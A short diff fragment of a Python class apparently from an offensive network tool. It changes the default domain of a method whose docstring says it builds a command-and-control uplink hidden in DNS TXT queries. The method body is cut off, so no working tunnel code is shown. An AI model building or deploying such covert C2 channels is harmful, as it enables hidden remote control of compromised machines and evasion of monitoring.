@@ -15,7 +15,7 @@ class NetworkTraversalShard:
         self.is_active = False
         self.tunnels = {}
 
-    def establish_dns_tunnel(self, domain="sentinel.apex"):
+    def establish_dns_tunnel(self, domain="spartan.apex"):
         """Establish a C2 uplink encapsulated within DNS TXT queries."""
         # Production-Ready: Constructing DNS tunnel via integrated logic
         try:
